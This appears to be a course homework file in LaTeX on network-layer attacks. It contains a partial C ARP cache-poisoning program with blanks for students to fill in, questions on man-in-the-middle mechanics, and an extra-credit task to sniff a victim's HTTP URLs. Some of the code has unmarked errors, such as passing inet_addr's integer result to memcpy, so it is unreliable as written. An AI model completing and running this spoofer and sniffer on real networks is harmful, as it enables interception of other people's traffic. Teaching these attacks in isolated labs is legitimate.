@@ -1,0 +1,159 @@
+\documentclass[11pt]{article}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{amsmath}
+
+\geometry{margin=1in}
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{CS 161: Computer Security}
+\rhead{Spring 2026}
+\cfoot{\thepage}
+
+% Code listing style
+\lstdefinestyle{cstyle}{
+    language=C,
+    basicstyle=\ttfamily\small,
+    keywordstyle=\color{blue}\bfseries,
+    commentstyle=\color{green!50!black},
+    numbers=left,
+    numberstyle=\tiny,
+    frame=single,
+    breaklines=true,
+    showstringspaces=false
+}
+
+\begin{document}
+
+\begin{center}
+    {\huge\bfseries Homework 4: Network Layer Attacks}\\[4pt]
+    \textbf{Due: Friday, April 10, 2026 at 11:59 pm}\\
+\end{center}
+
+\vspace{0.5em}\hrule\vspace{1em}
+
+\noindent\textbf{Instructions:} Answer all questions completely. For coding problems, include the source code in the appendix or as clearly marked listings. Using a coding agent or AI is allowed.
+
+\vspace{0.5em}\hrule\vspace{1em}
+
+
+\vspace{2em}
+
+\section*{ARP Cache Poisoning (12 points)}
+
+The Address Resolution Protocol (ARP) is used to map IP addresses to MAC addresses on a local network. An attacker on the same subnet can send forged ARP replies to redirect traffic intended for another host through their machine (a man-in-the-middle attack).
+
+Below is an incomplete C program that demonstrates ARP cache poisoning in a controlled lab environment. The code is designed to run on an isolated network with the following fixed IP addresses:
+\begin{itemize}
+    \item Target: 10.0.0.100
+    \item Gateway: 10.0.0.1
+    \item Attacker: 10.0.0.101
+\end{itemize}
+\textbf{Do not run this code outside the designated course VM.}
+
+\begin{lstlisting}[style=cstyle, caption={arp\_poison.c (partial)}]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <net/if_arp.h>
+#include <netinet/if_ether.h>
+#include <netpacket/packet.h>
+#include <arpa/inet.h>
+
+#define TARGET_IP    "10.0.0.100"
+#define GATEWAY_IP   "10.0.0.1"
+#define ATTACKER_IP  "10.0.0.101"
+#define INTERFACE    "eth0"
+
+/**
+ * Sends a forged ARP reply to poison the target's cache.
+ * @param target_ip   - IP to poison (should be TARGET_IP or GATEWAY_IP)
+ * @param spoofed_ip  - IP we are claiming to be (the other endpoint)
+ * @param spoofed_mac - MAC address we want the target to associate with spoofed_ip
+ */
+void send_arp_reply(const char *target_ip, const char *spoofed_ip,
+        const uint8_t *spoofed_mac) {
+    int sockfd;
+    struct sockaddr_ll sa;
+    struct ether_arp *packet;
+    unsigned char buffer[sizeof(struct ether_arp)];
+
+    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
+        perror("socket");
+        return;
+    }
+
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family   = AF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ARP);
+    sa.sll_ifindex  = if_nametoindex(INTERFACE);
+
+    packet = (struct ether_arp *)buffer;
+    memset(packet, 0, sizeof(struct ether_arp));
+
+    uint8_t target_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55}; // placeholder
+    memcpy(packet->arp_sha, spoofed_mac, 6);
+    memcpy(packet->arp_spa, inet_addr(spoofed_ip), 4);
+    memcpy(packet->arp_tha, target_mac, 6);
+    memcpy(packet->arp_tpa, inet_addr(target_ip), 4);
+    packet->arp_hrd = htons(ARPHRD_ETHER);
+    packet->arp_pro = htons(ETH_P_IP);
+    packet->arp_hln = 6;
+    packet->arp_pln = 4;
+    packet->arp_op  = htons(________);   // <-- BLANK 1: ARP opcode
+
+    if (sendto(sockfd, buffer, sizeof(struct ether_arp), 0,
+               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        perror("sendto");
+    }
+    close(sockfd);
+}
+
+int main() {
+    uint8_t attacker_mac[6] = {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff};
+
+    printf("Starting ARP spoofing demonstration in course lab...\n");
+    printf("Target: %s, Gateway: %s\n", TARGET_IP, GATEWAY_IP);
+
+    // Poison target: tell target that gateway's IP is at attacker's MAC
+    send_arp_reply(________, ________, attacker_mac);   // <-- BLANK 2
+
+    // Poison gateway: tell gateway that target's IP is at attacker's MAC
+    send_arp_reply(________, ________, attacker_mac);   // <-- BLANK 3
+
+    printf("ARP cache poisoned. Now enable IP forwarding and start sniffing.\n");
+    return 0;
+}
+\end{lstlisting}
+
+\begin{enumerate}[label=(\alph*)]
+    \item Fill in the missing blanks (marked \texttt{\_\_\_\_}) in the code. Explain the purpose of the \texttt{arp\_op} field and why it must be set to \texttt{ARPOP\_REPLY}.
+
+    \item In the \texttt{main} function, two calls to \texttt{send\_arp\_reply} are made. Describe what each call accomplishes and why both are necessary for a successful MITM attack.
+
+    \item After the ARP cache is poisoned, what additional step must the attacker take to actually intercept and forward traffic? (Hint: consider the operating system's network stack.)
+\end{enumerate}
+
+\newpage
+\section*{Extra Credit (5 points) – HTTP Traffic Sniffer}
+
+Extend the ARP spoofing program to also capture HTTP traffic (port 80) from the target after poisoning. Your extension should:
+
+\begin{itemize}
+    \item Enable IP forwarding automatically (via \texttt{/proc} or system call).
+    \item Use \texttt{libpcap} or raw sockets to sniff packets and log all visited URLs.
+    \item Print the URLs to the console in real time.
+\end{itemize}
+
+Provide the complete modified code and a brief explanation of your changes. You may write the extension in C or Python. If using Python, you may use libraries such as \texttt{scapy} or \texttt{pcap}.
+
+\textbf{Hint:} After poisoning, all traffic from the target will flow through the attacker's machine. By enabling IP forwarding, you allow the traffic to be forwarded to its real destination, maintaining connectivity. Sniffing the HTTP requests allows you to extract the requested URLs.
+
+\end{document}
